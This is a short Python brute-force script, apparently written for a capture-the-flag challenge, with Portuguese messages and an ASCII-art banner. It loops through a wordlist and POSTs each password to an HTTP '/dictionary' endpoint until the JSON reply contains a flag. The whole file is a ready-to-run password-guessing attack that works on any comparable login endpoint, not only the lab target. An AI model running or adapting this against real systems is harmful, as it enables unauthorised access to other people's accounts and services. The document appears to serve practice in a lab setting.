import requests
import sys
import pyfiglet
from termcolor import colored

def display_logo():
    print(" ")
    print("  ██▓     ██▓  ██████ ▄▄▄█████▓ ██▀███   ██▓ ██▓███  ▓█████ ")
    print(" ▓██▒    ▓██▒▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒▓██░  ██▒▓█   ▀ ")
    print(" ▒██░    ▒██▒░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▒███   ")
    print(" ▒██░    ░██░  ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▒██▄█▓▒ ▒▒▓█  ▄ ")
    print(" ░██████▒░██░▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ ░  ░░▒████▒")
    print(" ░ ▒░▓  ░░▓  ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░░░ ▒░ ░")
    print(" ░ ░ ▒  ░ ▒ ░░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ▒ ░░▒ ░      ░ ░  ░")
    print("   ░ ░    ▒ ░░  ░  ░    ░        ░░   ░  ▒ ░░░          ░   ")
    print("     ░  ░ ░        ░               ░      ░            ░  ░")
    print(" ")

if __name__ == "__main__":
    display_logo()

if len(sys.argv) != 4:
    print("Uso: Python listRide.py [ip] [port] [wordlist]")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])
wordlist_path = sys.argv[3]

try:
    with open(wordlist_path, "r") as file:
       passwords = file.read().splitlines()
except FileNotFoundError:
    print(f"Erro: O arquivo '{wordlist_path}' Não foi encontrado")
    sys.exit(1)

for password in passwords:
    print(f"Attempted password: {password}")
    try:
        response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
        if response.ok and 'flag' in response.json():
            print(f"Correct password found:{password}")
            print(f"Flag:{response.json()['flag']}")
            break
    except requests.RequestException as e:
        print(f"Erro ao se conectar ao servidor: (e)")
        sys.exit(1)
